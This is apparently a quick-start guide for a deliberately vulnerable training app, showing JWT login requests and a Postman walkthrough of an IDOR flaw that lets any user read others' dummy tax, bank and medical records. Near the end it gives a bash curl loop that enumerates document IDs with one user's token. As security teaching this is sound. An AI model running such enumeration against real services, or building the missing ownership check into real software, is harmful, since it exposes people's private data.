# Quick Start: Testing JWT & IDOR with Postman

## Pre-requisites
- Backend running on `http://localhost:8080`
- MySQL running on `localhost:3307`
- Postman installed

---

## Step 1: Login with Pre-loaded Users

### Test User Credentials (Password: `password`)
- alice@example.com
- bob@example.com
- admin@example.com

### Login Request (Get JWT Token)
```
POST http://localhost:8080/api/auth/login
Content-Type: application/json

{
  "email": "alice@example.com",
  "password": "password"
}
```

### Expected Response
```json
{
  "token": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZUBleGFtcGxlLmNvbSIsInVzZXJJZCI6MSwiaWF0IjoxNzEyNzk4NDA1LCJleHAiOjE3MTI4ODQ4MDV9.W_...",
  "type": "Bearer",
  "userId": 1,
  "email": "alice@example.com",
  "firstName": "Alice",
  "lastName": "Smith"
}
```

**Save the `token` value** - you'll need it for subsequent requests.

---

## Step 2: Test Access to Own Documents (Legitimate)

### Endpoint: Get Alice's Documents
```
GET http://localhost:8080/api/documents/user/1
Authorization: Bearer <PASTE_TOKEN_HERE>
```

### Expected Response (Alice can access her own documents)
```json
[
  {
    "id": 101,
    "title": "Alice W2 Form",
    "content": "SSN: 123-45-678, Income: $50,000",
    "owner": {
      "id": 1,
      "email": "alice@example.com",
      "firstName": "Alice",
      "lastName": "Smith",
      "role": "USER"
    }
  },
  {
    "id": 102,
    "title": "Alice Medical Record",
    "content": "Condition: Asthma, Medication: Albuterol",
    "owner": {
      "id": 1,
      "email": "alice@example.com",
      "firstName": "Alice",
      "lastName": "Smith",
      "role": "USER"
    }
  }
]
```

---

## Step 3: Demonstrate IDOR Vulnerability ⚠️

### Endpoint: Access Bob's Document with Alice's Token
```
GET http://localhost:8080/api/documents/103
Authorization: Bearer <ALICE_TOKEN>
```

### What Happens (The Vulnerability)
Alice can directly access Bob's Bank Statement using just the document ID!

### Response (403 or 200?)
```json
{
  "id": 103,
  "title": "Bob Bank Statement",
  "content": "Account: 987654321, Balance: $12,500",
  "owner": {
    "id": 2,
    "email": "bob@example.com",
    "firstName": "Bob",
    "lastName": "Johnson",
    "role": "USER"
  }
}
```

**NOTE**: Currently returns `200 OK` - this is the **IDOR vulnerability**!
- ✅ JWT Authentication: Working (Alice is verified as valid user)
- ❌ Object Authorization: Missing (No check if Alice owns document 103)

---

## Step 4: Test with Different User (Bob)

### Login as Bob
```
POST http://localhost:8080/api/auth/login
Content-Type: application/json

{
  "email": "bob@example.com",
  "password": "password"
}
```

### Try Accessing Alice's Document with Bob's Token
```
GET http://localhost:8080/api/documents/101
Authorization: Bearer <BOB_TOKEN>
```

**Result**: Bob can also access Alice's documents! (Vulnerability confirmed)

---

## Step 5: Register a New User

### Register New Account
```
POST http://localhost:8080/api/auth/register
Content-Type: application/json

{
  "email": "charlie@example.com",
  "password": "CharliePwd123!",
  "firstName": "Charlie",
  "lastName": "Brown"
}
```

### Expected Response (201 Created)
```json
{
  "message": "User registered successfully",
  "userId": 4,
  "email": "charlie@example.com",
  "firstName": "Charlie",
  "lastName": "Brown"
}
```

### Login with New User
```
POST http://localhost:8080/api/auth/login
Content-Type: application/json

{
  "email": "charlie@example.com",
  "password": "CharliePwd123!"
}
```

### Charlie Can Also Access Everyone's Documents
```
GET http://localhost:8080/api/documents/103
Authorization: Bearer <CHARLIE_TOKEN>
```

---

## IDOR Enumeration Script (Simulate Attack)

The following curl commands simulate an attacker enumerating all documents:

```bash
# Get JWT token for alice
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.com","password":"password"}' | grep -o '"token":"[^"]*' | cut -d'"' -f4)

# Enumerate documents 100-150
for i in {100..150}; do
  echo "=== Document $i ==="
  curl -s -X GET http://localhost:8080/api/documents/$i \
    -H "Authorization: Bearer $TOKEN" | jq .
done
```

**Expected**: Will retrieve documents 101, 102, 103, 104 successfully, proving enumeration is possible.

---

## What This Demonstrates

### ✅ Working Features
- User registration with email
- JWT token generation on login
- Token validation on protected endpoints
- Authentication is enforced

### ❌ IDOR Vulnerability (Still Present)
- No ownership verification before returning documents
- Sequential IDs allow enumeration
- Any authenticated user can access any document
- Perfect for Phase 2 attack demonstration!

---

## Postman Collection Shortcuts

Save these as Postman requests:

### Login Alice
```
POST http://localhost:8080/api/auth/login
Body: {"email":"alice@example.com","password":"password"}
```

### View Alice's Docs
```
GET http://localhost:8080/api/documents/user/1
Headers: Authorization: Bearer {{token}}
```

### Access Bob's Doc (IDOR Test)
```
GET http://localhost:8080/api/documents/103
Headers: Authorization: Bearer {{token}}
```

Use Postman's Environment variables to store `{{token}}` for easy testing!

---

## Expected Behavior During Phase 2 Attack Demo

When Python script runs:
1. ✅ Registers attacker account or uses existing account
2. ✅ Obtains JWT token
3. ✅ Brute-forces document IDs (100-200)
4. ✅ Successfully downloads all documents (no authorization checks)
5. ✅ Demonstrates complete IDOR compromise

This validates that Phase 1 (vulnerable implementation) is complete and ready for Phase 2 exploitation!
